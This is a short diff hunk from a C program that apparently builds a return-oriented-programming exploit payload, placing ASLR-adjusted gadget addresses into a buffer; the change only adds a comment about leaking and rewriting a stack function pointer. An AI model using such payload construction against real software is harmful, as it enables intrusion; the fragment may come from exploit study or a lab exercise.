@@ -195,6 +195,8 @@ main(int argc, char **argv)
 	addr_aslr = laddr + gadget13_OFF;
 	memcpy(payload + 44, &addr_aslr, sizeof(addr_aslr));
 
+    // Note that I could leak the value stored in the function pointer on the stack, then write it back
+
 	// Value into EAX
 	addr_aslr = baddr + fmt_plain_OFF;
 	memcpy(payload + 48, &addr_aslr, sizeof(addr_aslr));
